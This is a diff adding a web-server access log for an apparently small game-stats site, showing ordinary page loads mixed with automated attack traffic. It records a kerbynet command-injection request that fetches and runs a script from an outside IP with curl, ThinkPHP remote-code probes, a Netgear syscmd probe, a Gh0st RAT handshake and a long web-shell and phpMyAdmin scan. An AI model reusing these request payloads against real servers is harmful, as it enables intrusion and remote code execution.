@@ -805,3 +805,841 @@
 07:28:34: scrumpy query success07:28:34: 
 07:28:34: seawolf query success07:28:34: 
 07:28:34: seis query success07:28:34: 
+07:27:36:  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)07:27:36: 
+07:27:47: 72.191.29.70 - - [17/Jul/2020 07:27:47] "[37mGET / HTTP/1.1[0m" 200 -07:27:47: 
+07:27:48: 72.191.29.70 - - [17/Jul/2020 07:27:48] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -07:27:48: 
+07:27:48: 72.191.29.70 - - [17/Jul/2020 07:27:48] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -07:27:48: 
+07:27:48: 72.191.29.70 - - [17/Jul/2020 07:27:48] "[37mGET /static/images/silvertrophy.png HTTP/1.1[0m" 200 -07:27:48: 
+07:27:48: 72.191.29.70 - - [17/Jul/2020 07:27:48] "[36mGET /static/images/darkan.png HTTP/1.1[0m" 304 -07:27:48: 
+07:27:48: 72.191.29.70 - - [17/Jul/2020 07:27:48] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -07:27:48: 
+07:27:48: 72.191.29.70 - - [17/Jul/2020 07:27:48] "[37mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 200 -07:27:48: 
+07:27:48: 72.191.29.70 - - [17/Jul/2020 07:27:48] "[37mGET /static/images/icons/ectophial.png HTTP/1.1[0m" 200 -07:27:48: 
+07:29:20: 72.191.29.70 - - [17/Jul/2020 07:29:20] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -07:29:20: 
+07:32:38: 61.71.122.64 - - [17/Jul/2020 07:32:38] "[37mGET / HTTP/1.1[0m" 200 -07:32:38: 
+07:37:10: 90.103.141.231 - - [17/Jul/2020 07:37:10] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1[0m" 404 -07:37:10: 
+07:37:33: 91.237.200.72 - - [17/Jul/2020 07:37:33] "[37mGET / HTTP/1.1[0m" 200 -07:37:33: 
+08:00:12: 103.145.12.200 - - [17/Jul/2020 08:00:12] "[37mGET / HTTP/1.1[0m" 200 -08:00:12: 
+08:08:32: 66.240.205.34 - - [17/Jul/2020 08:08:32] code 400, message Bad request syntax ("Gh0st\xad\x00\x00\x00à\x00\x00\x00x\x9cKS``\x98ÃÀÀÀ\x06Ä\x8c@¼Q\x96\x81\x81\tH\x07§\x16\x95e&§*\x04$&g+\x182\x94ö°00¬¨rc\x00\x01\x11\xa0\x82\x1f\\`&\x83ÇK7\x86\x19ån\x0c9\x95n\x0c;\x84\x0f3¬èsch¨^Ï4'J\x97©\x82ã0Ã\x91h]&\x90øÎ\x97SËA4L?2=áÄ\x92\x86\x0b@õ`\x0cT\x1f®¯]")08:08:32: 
+08:08:32: 66.240.205.34 - - [17/Jul/2020 08:08:32] "[35m[1mGh0st­   à   xKS``ÃÀÀÀÄ@¼Q	H§e&§*$&g+2ö°00¬¨rc  \`&ÇK7ån9n;3¬èsch¨^Ï4'J©ã0Ãh]&øÎSËA4L?2=áÄ@õ`T®¯][0m" HTTPStatus.BAD_REQUEST -08:08:32: 
+08:44:48: 64.225.67.104 - - [17/Jul/2020 08:44:48] code 400, message Bad request version ('G?Ç)J\x08µ+^9\x16j')08:44:48: 
+08:44:48: 64.225.67.104 - - [17/Jul/2020 08:44:48] "[35m[1má1u=	c{F)esFÖ.\ËX G?Ç)Jµ+^9j[0m" HTTPStatus.BAD_REQUEST -08:44:48: 
+08:49:24: 83.97.20.30 - - [17/Jul/2020 08:49:24] "[37mGET / HTTP/1.0[0m" 200 -08:49:24: 
+08:50:29: 95.170.119.232 - - [17/Jul/2020 08:50:29] "[37mGET / HTTP/1.1[0m" 200 -08:50:29: 
+08:54:34: 45.81.17.186 - - [17/Jul/2020 08:54:34] "[37mGET / HTTP/1.1[0m" 200 -08:54:34: 
+09:24:46: 89.109.35.22 - - [17/Jul/2020 09:24:46] "[37mGET / HTTP/1.1[0m" 200 -09:24:46: 
+09:29:09: 194.15.36.37 - - [17/Jul/2020 09:29:09] "[37mGET / HTTP/1.1[0m" 200 -09:29:09: 
+10:12:36: 202.51.178.57 - - [17/Jul/2020 10:12:36] "[37mGET / HTTP/1.1[0m" 200 -10:12:36: 
+11:22:11: 59.126.195.116 - - [17/Jul/2020 11:22:11] "[37mGET / HTTP/1.1[0m" 200 -11:22:11: 
+12:03:44: 192.241.217.80 - - [17/Jul/2020 12:03:44] "[33mGET /hudson HTTP/1.1[0m" 404 -12:03:44: 
+12:41:06: 114.239.205.96 - - [17/Jul/2020 12:41:06] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -12:41:06: 
+12:46:42: 83.97.20.196 - - [17/Jul/2020 12:46:42] code 400, message Bad request version ('Ý%d1\x17¦%nÅ')12:46:42: 
+12:46:42: 83.97.20.196 - - [17/Jul/2020 12:46:42] "[35m[1mÉÑ¦®lM/	p#î*5#]ÇR:È/¸ÍZû¤fÒÎ³¡»ü Ý%d1¦%nÅ[0m" HTTPStatus.BAD_REQUEST -12:46:42: 
+12:50:33: 46.127.115.224 - - [17/Jul/2020 12:50:33] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -12:50:33: 
+13:03:05: 49.213.194.118 - - [17/Jul/2020 13:03:05] "[37mGET / HTTP/1.1[0m" 200 -13:03:05: 
+13:09:48: 80.82.70.140 - - [17/Jul/2020 13:09:48] "[37mGET / HTTP/1.1[0m" 200 -13:09:48: 
+13:11:41: 71.6.232.9 - - [17/Jul/2020 13:11:41] "[37mGET / HTTP/1.1[0m" 200 -13:11:41: 
+13:12:46: 23.228.129.6 - - [17/Jul/2020 13:12:46] "[37mGET / HTTP/1.1[0m" 200 -13:12:46: 
+13:12:46: 23.228.129.6 - - [17/Jul/2020 13:12:46] "[37mGET /static/images/darkan.png HTTP/1.1[0m" 200 -13:12:46: 
+13:12:46: 23.228.129.6 - - [17/Jul/2020 13:12:46] "[37mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 200 -13:12:46: 
+13:12:46: 23.228.129.6 - - [17/Jul/2020 13:12:46] "[37mGET /static/images/silvertrophy.png HTTP/1.1[0m" 200 -13:12:46: 
+13:12:46: 23.228.129.6 - - [17/Jul/2020 13:12:46] "[37mGET /static/pages.css HTTP/1.1[0m" 200 -13:12:46: 
+13:12:46: 23.228.129.6 - - [17/Jul/2020 13:12:46] "[37mGET /static/images/goldtrophy.png HTTP/1.1[0m" 200 -13:12:46: 
+13:12:46: 23.228.129.6 - - [17/Jul/2020 13:12:46] "[37mGET /static/images/logo.png HTTP/1.1[0m" 200 -13:12:46: 
+14:09:11: 92.63.194.64 - - [17/Jul/2020 14:09:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')14:09:11: 
+14:09:11: 92.63.194.64 - - [17/Jul/2020 14:09:11] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -14:09:11: 
+14:09:28: 106.13.35.234 - - [17/Jul/2020 14:09:28] "[37mGET / HTTP/1.1[0m" 200 -14:09:28: 
+14:11:00: 106.13.35.234 - - [17/Jul/2020 14:11:00] "[33mPOST /base/post.php HTTP/1.1[0m" 404 -14:11:00: 
+14:11:04: 106.13.35.234 - - [17/Jul/2020 14:11:04] "[33mGET /webdav/ HTTP/1.1[0m" 404 -14:11:04: 
+14:11:12: 106.13.35.234 - - [17/Jul/2020 14:11:12] "[33mGET /java.php HTTP/1.1[0m" 404 -14:11:12: 
+14:11:16: 106.13.35.234 - - [17/Jul/2020 14:11:16] "[33mGET /_query.php HTTP/1.1[0m" 404 -14:11:16: 
+14:11:20: 106.13.35.234 - - [17/Jul/2020 14:11:20] "[33mGET /test.php HTTP/1.1[0m" 404 -14:11:20: 
+14:11:24: 106.13.35.234 - - [17/Jul/2020 14:11:24] "[33mGET /db_cts.php HTTP/1.1[0m" 404 -14:11:24: 
+14:11:32: 106.13.35.234 - - [17/Jul/2020 14:11:32] "[33mGET /logon.php HTTP/1.1[0m" 404 -14:11:32: 
+14:11:36: 106.13.35.234 - - [17/Jul/2020 14:11:36] "[33mGET /help-e.php HTTP/1.1[0m" 404 -14:11:36: 
+14:11:40: 106.13.35.234 - - [17/Jul/2020 14:11:40] "[33mGET /license.php HTTP/1.1[0m" 404 -14:11:40: 
+14:11:44: 106.13.35.234 - - [17/Jul/2020 14:11:44] "[33mGET /log.php HTTP/1.1[0m" 404 -14:11:44: 
+14:11:48: 106.13.35.234 - - [17/Jul/2020 14:11:48] "[33mGET /hell.php HTTP/1.1[0m" 404 -14:11:48: 
+14:11:52: 106.13.35.234 - - [17/Jul/2020 14:11:52] "[33mGET /pmd_online.php HTTP/1.1[0m" 404 -14:11:52: 
+14:11:56: 106.13.35.234 - - [17/Jul/2020 14:11:56] "[33mGET /x.php HTTP/1.1[0m" 404 -14:11:56: 
+14:12:00: 106.13.35.234 - - [17/Jul/2020 14:12:00] "[33mGET /shell.php HTTP/1.1[0m" 404 -14:12:00: 
+14:12:04: 106.13.35.234 - - [17/Jul/2020 14:12:04] "[33mGET /b.php HTTP/1.1[0m" 404 -14:12:04: 
+14:12:12: 106.13.35.234 - - [17/Jul/2020 14:12:12] "[33mGET /desktop.ini.php HTTP/1.1[0m" 404 -14:12:12: 
+14:12:20: 106.13.35.234 - - [17/Jul/2020 14:12:20] "[33mGET /lala.php HTTP/1.1[0m" 404 -14:12:20: 
+14:12:32: 106.13.35.234 - - [17/Jul/2020 14:12:32] "[33mGET /t6nv.php HTTP/1.1[0m" 404 -14:12:32: 
+14:12:36: 106.13.35.234 - - [17/Jul/2020 14:12:36] "[33mGET /text.php HTTP/1.1[0m" 404 -14:12:36: 
+14:12:40: 106.13.35.234 - - [17/Jul/2020 14:12:40] "[33mGET /wp-config.php HTTP/1.1[0m" 404 -14:12:40: 
+14:12:44: 106.13.35.234 - - [17/Jul/2020 14:12:44] "[33mGET /muhstik.php HTTP/1.1[0m" 404 -14:12:44: 
+14:12:48: 106.13.35.234 - - [17/Jul/2020 14:12:48] "[33mGET /muhstiks.php HTTP/1.1[0m" 404 -14:12:48: 
+14:12:52: 106.13.35.234 - - [17/Jul/2020 14:12:52] "[33mGET /muhstik-dpr.php HTTP/1.1[0m" 404 -14:12:52: 
+14:12:56: 106.13.35.234 - - [17/Jul/2020 14:12:56] "[33mGET /lol.php HTTP/1.1[0m" 404 -14:12:56: 
+14:13:04: 106.13.35.234 - - [17/Jul/2020 14:13:04] "[33mGET /cmd.php HTTP/1.1[0m" 404 -14:13:04: 
+14:13:08: 106.13.35.234 - - [17/Jul/2020 14:13:08] "[33mGET /cmv.php HTTP/1.1[0m" 404 -14:13:08: 
+14:13:12: 106.13.35.234 - - [17/Jul/2020 14:13:12] "[33mGET /knal.php HTTP/1.1[0m" 404 -14:13:12: 
+14:13:16: 106.13.35.234 - - [17/Jul/2020 14:13:16] "[33mGET /shell.php HTTP/1.1[0m" 404 -14:13:16: 
+14:13:20: 106.13.35.234 - - [17/Jul/2020 14:13:20] "[33mGET /appserv.php HTTP/1.1[0m" 404 -14:13:20: 
+14:13:32: 106.13.35.234 - - [17/Jul/2020 14:13:32] "[33mGET /scripts/db___.init.php HTTP/1.1[0m" 404 -14:13:32: 
+14:13:33: 106.13.35.234 - - [17/Jul/2020 14:13:33] "[33mGET /phpmyadmin/scripts/db___.init.php HTTP/1.1[0m" 404 -14:13:33: 
+14:13:36: 106.13.35.234 - - [17/Jul/2020 14:13:36] "[33mGET /phpMyAdmin/scripts/db___.init.php HTTP/1.1[0m" 404 -14:13:36: 
+14:13:48: 106.13.35.234 - - [17/Jul/2020 14:13:48] "[33mGET /myadmin/scripts/setup.php HTTP/1.1[0m" 404 -14:13:48: 
+14:13:56: 106.13.35.234 - - [17/Jul/2020 14:13:56] "[33mGET /pma/scripts/db___.init.php HTTP/1.1[0m" 404 -14:13:56: 
+14:14:00: 106.13.35.234 - - [17/Jul/2020 14:14:00] "[33mGET /PMA/scripts/db___.init.php HTTP/1.1[0m" 404 -14:14:00: 
+14:14:01: 106.13.35.234 - - [17/Jul/2020 14:14:01] "[33mGET /myadmin/scripts/db___.init.php HTTP/1.1[0m" 404 -14:14:01: 
+14:14:05: 106.13.35.234 - - [17/Jul/2020 14:14:05] "[33mGET /MyAdmin/scripts/db___.init.php HTTP/1.1[0m" 404 -14:14:05: 
+14:14:12: 106.13.35.234 - - [17/Jul/2020 14:14:12] "[33mGET /cacti/plugins/weathermap/editor.php HTTP/1.1[0m" 404 -14:14:12: 
+14:14:13: 106.13.35.234 - - [17/Jul/2020 14:14:13] "[33mGET /weathermap/editor.php HTTP/1.1[0m" 404 -14:14:13: 
+14:14:16: 106.13.35.234 - - [17/Jul/2020 14:14:16] "[33mGET /index.php?s=%2findex%2f%5cthink%5capp%2finvokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1[0m" 404 -14:14:16: 
+14:14:20: 106.13.35.234 - - [17/Jul/2020 14:14:20] "[33mGET /elrekt.php?s=%2findex%2f%5cthink%5capp%2finvokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1[0m" 404 -14:14:20: 
+14:14:24: 106.13.35.234 - - [17/Jul/2020 14:14:24] "[33mGET /App/?content=die(md5(HelloThinkPHP)) HTTP/1.1[0m" 404 -14:14:24: 
+14:14:28: 106.13.35.234 - - [17/Jul/2020 14:14:28] "[33mGET /index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))} HTTP/1.1[0m" 404 -14:14:28: 
+14:14:29: 106.13.35.234 - - [17/Jul/2020 14:14:29] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -14:14:29: 
+14:14:32: 106.13.35.234 - - [17/Jul/2020 14:14:32] "[37mGET / HTTP/1.1[0m" 200 -14:14:32: 
+14:14:36: 106.13.35.234 - - [17/Jul/2020 14:14:36] "[33mGET /joomla/ HTTP/1.1[0m" 404 -14:14:36: 
+14:14:45: 106.13.35.234 - - [17/Jul/2020 14:14:45] "[33mGET /Joomla/ HTTP/1.1[0m" 404 -14:14:45: 
+14:14:45: 106.13.35.234 - - [17/Jul/2020 14:14:45] "[37mGET /?a=echo%20-n%20HelloNginx%7Cmd5sum HTTP/1.1[0m" 200 -14:14:45: 
+14:14:48: 106.13.35.234 - - [17/Jul/2020 14:14:48] "[33mGET /d7.php HTTP/1.1[0m" 404 -14:14:48: 
+14:14:52: 106.13.35.234 - - [17/Jul/2020 14:14:52] "[33mGET /1x.php HTTP/1.1[0m" 404 -14:14:52: 
+14:14:56: 106.13.35.234 - - [17/Jul/2020 14:14:56] "[33mGET /undx.php HTTP/1.1[0m" 404 -14:14:56: 
+14:15:00: 106.13.35.234 - - [17/Jul/2020 14:15:00] "[33mGET /payload.php HTTP/1.1[0m" 404 -14:15:00: 
+14:15:04: 106.13.35.234 - - [17/Jul/2020 14:15:04] "[33mGET /composers.php HTTP/1.1[0m" 404 -14:15:04: 
+14:15:05: 106.13.35.234 - - [17/Jul/2020 14:15:05] "[33mGET /izom.php HTTP/1.1[0m" 404 -14:15:05: 
+14:15:08: 106.13.35.234 - - [17/Jul/2020 14:15:08] "[33mGET /hue2.php HTTP/1.1[0m" 404 -14:15:08: 
+14:15:12: 106.13.35.234 - - [17/Jul/2020 14:15:12] "[33mGET /Drupal.php HTTP/1.1[0m" 404 -14:15:12: 
+14:15:16: 106.13.35.234 - - [17/Jul/2020 14:15:16] "[33mGET /lang.php?f=1 HTTP/1.1[0m" 404 -14:15:16: 
+14:15:17: 106.13.35.234 - - [17/Jul/2020 14:15:17] "[33mGET /izom.php HTTP/1.1[0m" 404 -14:15:17: 
+14:15:17: 106.13.35.234 - - [17/Jul/2020 14:15:17] "[33mGET /payload.php HTTP/1.1[0m" 404 -14:15:17: 
+14:15:19: 106.13.35.234 - - [17/Jul/2020 14:15:19] "[33mGET /new_license.php HTTP/1.1[0m" 404 -14:15:19: 
+14:15:19: 106.13.35.234 - - [17/Jul/2020 14:15:19] "[33mGET /images/!.php HTTP/1.1[0m" 404 -14:15:19: 
+14:15:20: 106.13.35.234 - - [17/Jul/2020 14:15:20] "[33mGET /images/vuln.php HTTP/1.1[0m" 404 -14:15:20: 
+14:15:20: 106.13.35.234 - - [17/Jul/2020 14:15:20] "[33mGET /images/up.php HTTP/1.1[0m" 404 -14:15:20: 
+14:15:21: 106.13.35.234 - - [17/Jul/2020 14:15:21] "[33mGET /images/attari.php HTTP/1.1[0m" 404 -14:15:21: 
+14:15:24: 106.13.35.234 - - [17/Jul/2020 14:15:24] "[33mGET /images/stories/cmd.php HTTP/1.1[0m" 404 -14:15:24: 
+14:15:25: 106.13.35.234 - - [17/Jul/2020 14:15:25] "[33mGET /images/stories/filemga.php?ssp=RfVbHu HTTP/1.1[0m" 404 -14:15:25: 
+14:15:26: 106.13.35.234 - - [17/Jul/2020 14:15:26] "[33mGET /up.php HTTP/1.1[0m" 404 -14:15:26: 
+14:15:27: 106.13.35.234 - - [17/Jul/2020 14:15:27] "[33mGET /laravel.php HTTP/1.1[0m" 404 -14:15:27: 
+14:15:28: 106.13.35.234 - - [17/Jul/2020 14:15:28] "[33mGET /yu.php HTTP/1.1[0m" 404 -14:15:28: 
+14:15:29: 106.13.35.234 - - [17/Jul/2020 14:15:29] "[33mGET /floaw.php HTTP/1.1[0m" 404 -14:15:29: 
+14:15:52: 106.13.35.234 - - [17/Jul/2020 14:15:52] "[33mGET /zz.php HTTP/1.1[0m" 404 -14:15:52: 
+14:16:00: 106.13.35.234 - - [17/Jul/2020 14:16:00] "[33mGET /ak.php HTTP/1.1[0m" 404 -14:16:00: 
+14:16:16: 106.13.35.234 - - [17/Jul/2020 14:16:16] "[33mGET /python.php HTTP/1.1[0m" 404 -14:16:16: 
+14:16:20: 106.13.35.234 - - [17/Jul/2020 14:16:20] "[33mGET /woshimengmei.php HTTP/1.1[0m" 404 -14:16:20: 
+14:16:24: 106.13.35.234 - - [17/Jul/2020 14:16:24] "[33mGET /taisui.php HTTP/1.1[0m" 404 -14:16:24: 
+14:16:32: 106.13.35.234 - - [17/Jul/2020 14:16:32] "[33mGET /xsser.php HTTP/1.1[0m" 404 -14:16:32: 
+14:16:36: 106.13.35.234 - - [17/Jul/2020 14:16:36] "[33mGET /zzz.php HTTP/1.1[0m" 404 -14:16:36: 
+14:16:37: 106.13.35.234 - - [17/Jul/2020 14:16:37] "[33mGET /99.php HTTP/1.1[0m" 404 -14:16:37: 
+14:16:37: 106.13.35.234 - - [17/Jul/2020 14:16:37] "[33mGET /dp.php HTTP/1.1[0m" 404 -14:16:37: 
+14:16:40: 106.13.35.234 - - [17/Jul/2020 14:16:40] "[33mGET /hs.php HTTP/1.1[0m" 404 -14:16:40: 
+14:16:41: 106.13.35.234 - - [17/Jul/2020 14:16:41] "[33mGET /1ts.php HTTP/1.1[0m" 404 -14:16:41: 
+14:16:41: 106.13.35.234 - - [17/Jul/2020 14:16:41] "[33mGET /haiyan.php HTTP/1.1[0m" 404 -14:16:41: 
+14:16:44: 106.13.35.234 - - [17/Jul/2020 14:16:44] "[33mGET /phpdm.php HTTP/1.1[0m" 404 -14:16:44: 
+14:16:45: 106.13.35.234 - - [17/Jul/2020 14:16:45] "[33mGET /root.php HTTP/1.1[0m" 404 -14:16:45: 
+14:16:45: 106.13.35.234 - - [17/Jul/2020 14:16:45] "[33mGET /5678.php HTTP/1.1[0m" 404 -14:16:45: 
+14:16:49: 106.13.35.234 - - [17/Jul/2020 14:16:49] "[33mGET /root11.php HTTP/1.1[0m" 404 -14:16:49: 
+14:16:52: 106.13.35.234 - - [17/Jul/2020 14:16:52] "[33mGET /xiu.php HTTP/1.1[0m" 404 -14:16:52: 
+14:16:53: 106.13.35.234 - - [17/Jul/2020 14:16:53] "[33mPOST /wuwu11.php HTTP/1.1[0m" 404 -14:16:53: 
+14:16:56: 106.13.35.234 - - [17/Jul/2020 14:16:56] "[33mPOST /xw.php HTTP/1.1[0m" 404 -14:16:56: 
+14:16:57: 106.13.35.234 - - [17/Jul/2020 14:16:57] "[33mPOST /xw1.php HTTP/1.1[0m" 404 -14:16:57: 
+14:16:58: 106.13.35.234 - - [17/Jul/2020 14:16:58] "[33mPOST /9678.php HTTP/1.1[0m" 404 -14:16:58: 
+14:16:58: 106.13.35.234 - - [17/Jul/2020 14:16:58] "[33mPOST /wc.php HTTP/1.1[0m" 404 -14:16:58: 
+14:16:59: 106.13.35.234 - - [17/Jul/2020 14:16:59] "[33mPOST /xx.php HTTP/1.1[0m" 404 -14:16:59: 
+14:16:59: 106.13.35.234 - - [17/Jul/2020 14:16:59] "[33mPOST /xx.php HTTP/1.1[0m" 404 -14:16:59: 
+14:17:00: 106.13.35.234 - - [17/Jul/2020 14:17:00] "[33mPOST /s.php HTTP/1.1[0m" 404 -14:17:00: 
+14:17:02: 106.13.35.234 - - [17/Jul/2020 14:17:02] "[33mPOST /sheep.php HTTP/1.1[0m" 404 -14:17:02: 
+14:17:03: 106.13.35.234 - - [17/Jul/2020 14:17:03] "[33mPOST /qaq.php HTTP/1.1[0m" 404 -14:17:03: 
+14:17:03: 106.13.35.234 - - [17/Jul/2020 14:17:03] "[33mPOST /my.php HTTP/1.1[0m" 404 -14:17:03: 
+14:17:04: 106.13.35.234 - - [17/Jul/2020 14:17:04] "[33mPOST /qq.php HTTP/1.1[0m" 404 -14:17:04: 
+14:17:05: 106.13.35.234 - - [17/Jul/2020 14:17:05] "[33mPOST /aaa.php HTTP/1.1[0m" 404 -14:17:05: 
+14:17:05: 106.13.35.234 - - [17/Jul/2020 14:17:05] "[33mPOST /hhh.php HTTP/1.1[0m" 404 -14:17:05: 
+14:17:06: 106.13.35.234 - - [17/Jul/2020 14:17:06] "[33mPOST /jjj.php HTTP/1.1[0m" 404 -14:17:06: 
+14:17:06: 106.13.35.234 - - [17/Jul/2020 14:17:06] "[33mPOST /vvv.php HTTP/1.1[0m" 404 -14:17:06: 
+14:17:09: 106.13.35.234 - - [17/Jul/2020 14:17:09] "[33mPOST /ffr.php HTTP/1.1[0m" 404 -14:17:09: 
+14:17:11: 106.13.35.234 - - [17/Jul/2020 14:17:11] "[33mPOST /411.php HTTP/1.1[0m" 404 -14:17:11: 
+14:17:13: 106.13.35.234 - - [17/Jul/2020 14:17:13] "[33mPOST /421.php HTTP/1.1[0m" 404 -14:17:13: 
+14:17:15: 106.13.35.234 - - [17/Jul/2020 14:17:15] "[33mPOST /444.php HTTP/1.1[0m" 404 -14:17:15: 
+14:17:32: 106.13.35.234 - - [17/Jul/2020 14:17:32] "[33mPOST /9.php HTTP/1.1[0m" 404 -14:17:32: 
+14:17:52: 106.13.35.234 - - [17/Jul/2020 14:17:52] "[33mGET /seeyon/htmlofficeservlet HTTP/1.1[0m" 404 -14:17:52: 
+14:17:56: 106.13.35.234 - - [17/Jul/2020 14:17:56] "[33mGET /secure/ContactAdministrators!default.jspa HTTP/1.1[0m" 404 -14:17:56: 
+14:18:08: 106.13.35.234 - - [17/Jul/2020 14:18:08] "[33mGET /console/login/LoginForm.jsp HTTP/1.1[0m" 404 -14:18:08: 
+14:18:12: 106.13.35.234 - - [17/Jul/2020 14:18:12] "[33mPOST /index.php HTTP/1.1[0m" 404 -14:18:12: 
+14:18:16: 106.13.35.234 - - [17/Jul/2020 14:18:16] "[33mPOST /node/?_format=hal_json HTTP/1.1[0m" 404 -14:18:16: 
+14:18:20: 106.13.35.234 - - [17/Jul/2020 14:18:20] "[37mGET / HTTP/1.1[0m" 200 -14:18:20: 
+14:18:21: 106.13.35.234 - - [17/Jul/2020 14:18:21] "[33mGET /joomla/ HTTP/1.1[0m" 404 -14:18:21: 
+14:18:24: 106.13.35.234 - - [17/Jul/2020 14:18:24] "[33mPOST /user.php HTTP/1.1[0m" 404 -14:18:24: 
+14:18:28: 106.13.35.234 - - [17/Jul/2020 14:18:28] "[33mGET /index.php HTTP/1.1[0m" 404 -14:18:28: 
+14:18:29: 106.13.35.234 - - [17/Jul/2020 14:18:29] "[33mGET /phpmyadmin/index.php HTTP/1.1[0m" 404 -14:18:29: 
+14:18:32: 106.13.35.234 - - [17/Jul/2020 14:18:32] "[33mGET /pmd/index.php HTTP/1.1[0m" 404 -14:18:32: 
+14:18:33: 106.13.35.234 - - [17/Jul/2020 14:18:33] "[33mGET /pma/index.php HTTP/1.1[0m" 404 -14:18:33: 
+14:18:44: 106.13.35.234 - - [17/Jul/2020 14:18:44] "[33mGET /pmamy/index.php HTTP/1.1[0m" 404 -14:18:44: 
+14:18:48: 106.13.35.234 - - [17/Jul/2020 14:18:48] "[33mGET /pmamy2/index.php HTTP/1.1[0m" 404 -14:18:48: 
+14:18:49: 106.13.35.234 - - [17/Jul/2020 14:18:49] "[33mGET /mysql/index.php HTTP/1.1[0m" 404 -14:18:49: 
+14:18:52: 106.13.35.234 - - [17/Jul/2020 14:18:52] "[33mGET /db/index.php HTTP/1.1[0m" 404 -14:18:52: 
+14:18:53: 106.13.35.234 - - [17/Jul/2020 14:18:53] "[33mGET /dbadmin/index.php HTTP/1.1[0m" 404 -14:18:53: 
+14:19:00: 106.13.35.234 - - [17/Jul/2020 14:19:00] "[33mGET /admin/pma/index.php HTTP/1.1[0m" 404 -14:19:00: 
+14:19:01: 106.13.35.234 - - [17/Jul/2020 14:19:01] "[33mGET /admin/PMA/index.php HTTP/1.1[0m" 404 -14:19:01: 
+14:19:01: 106.13.35.234 - - [17/Jul/2020 14:19:01] "[33mGET /admin/mysql/index.php HTTP/1.1[0m" 404 -14:19:01: 
+14:19:01: 106.13.35.234 - - [17/Jul/2020 14:19:01] "[33mGET /admin/mysql2/index.php HTTP/1.1[0m" 404 -14:19:01: 
+14:19:04: 106.13.35.234 - - [17/Jul/2020 14:19:04] "[33mGET /admin/phpmyadmin/index.php HTTP/1.1[0m" 404 -14:19:04: 
+14:19:05: 106.13.35.234 - - [17/Jul/2020 14:19:05] "[33mGET /admin/phpMyAdmin/index.php HTTP/1.1[0m" 404 -14:19:05: 
+14:19:05: 106.13.35.234 - - [17/Jul/2020 14:19:05] "[33mGET /admin/phpmyadmin2/index.php HTTP/1.1[0m" 404 -14:19:05: 
+14:19:06: 106.13.35.234 - - [17/Jul/2020 14:19:06] "[33mGET /mysqladmin/index.php HTTP/1.1[0m" 404 -14:19:06: 
+14:19:09: 106.13.35.234 - - [17/Jul/2020 14:19:09] "[33mGET /mysql-admin/index.php HTTP/1.1[0m" 404 -14:19:09: 
+14:19:17: 106.13.35.234 - - [17/Jul/2020 14:19:17] "[33mGET /phpAdmin/index.php HTTP/1.1[0m" 404 -14:19:17: 
+14:19:20: 106.13.35.234 - - [17/Jul/2020 14:19:20] "[33mGET /phpmyadmin0/index.php HTTP/1.1[0m" 404 -14:19:20: 
+14:19:21: 106.13.35.234 - - [17/Jul/2020 14:19:21] "[33mGET /phpmyadmin1/index.php HTTP/1.1[0m" 404 -14:19:21: 
+14:19:24: 106.13.35.234 - - [17/Jul/2020 14:19:24] "[33mGET /phpmyadmin2/index.php HTTP/1.1[0m" 404 -14:19:24: 
+14:19:26: 106.13.35.234 - - [17/Jul/2020 14:19:26] "[33mGET /phpMyAdmin-4.4.0/index.php HTTP/1.1[0m" 404 -14:19:26: 
+14:19:28: 106.13.35.234 - - [17/Jul/2020 14:19:28] "[33mGET /phpMyAdmin4.8.0/index.php HTTP/1.1[0m" 404 -14:19:28: 
+14:19:32: 106.13.35.234 - - [17/Jul/2020 14:19:32] "[33mGET /phpMyAdmin4.8.1/index.php HTTP/1.1[0m" 404 -14:19:32: 
+14:19:34: 106.13.35.234 - - [17/Jul/2020 14:19:34] "[33mGET /phpMyAdmin4.8.2/index.php HTTP/1.1[0m" 404 -14:19:34: 
+14:19:34: 106.13.35.234 - - [17/Jul/2020 14:19:34] "[33mGET /phpMyAdmin4.8.3/index.php HTTP/1.1[0m" 404 -14:19:34: 
+14:19:34: 106.13.35.234 - - [17/Jul/2020 14:19:34] "[33mGET /phpMyAdmin4.8.4/index.php HTTP/1.1[0m" 404 -14:19:34: 
+14:19:35: 106.13.35.234 - - [17/Jul/2020 14:19:35] "[33mGET /phpMyAdmin4.8.5/index.php HTTP/1.1[0m" 404 -14:19:35: 
+14:19:36: 106.13.35.234 - - [17/Jul/2020 14:19:36] "[33mGET /myadmin2/index.php HTTP/1.1[0m" 404 -14:19:36: 
+14:19:37: 106.13.35.234 - - [17/Jul/2020 14:19:37] "[33mGET /xampp/phpmyadmin/index.php HTTP/1.1[0m" 404 -14:19:37: 
+14:19:37: 106.13.35.234 - - [17/Jul/2020 14:19:37] "[33mGET /phpMyadmin_bak/index.php HTTP/1.1[0m" 404 -14:19:37: 
+14:19:39: 106.13.35.234 - - [17/Jul/2020 14:19:39] "[33mGET /www/phpMyAdmin/index.php HTTP/1.1[0m" 404 -14:19:39: 
+14:19:40: 106.13.35.234 - - [17/Jul/2020 14:19:40] "[33mGET /tools/phpMyAdmin/index.php HTTP/1.1[0m" 404 -14:19:40: 
+14:19:41: 106.13.35.234 - - [17/Jul/2020 14:19:41] "[33mGET /phpmyadmin-old/index.php HTTP/1.1[0m" 404 -14:19:41: 
+14:19:44: 106.13.35.234 - - [17/Jul/2020 14:19:44] "[33mGET /phpMyAdminold/index.php HTTP/1.1[0m" 404 -14:19:44: 
+14:19:48: 106.13.35.234 - - [17/Jul/2020 14:19:48] "[33mGET /phpMyAdmin.old/index.php HTTP/1.1[0m" 404 -14:19:48: 
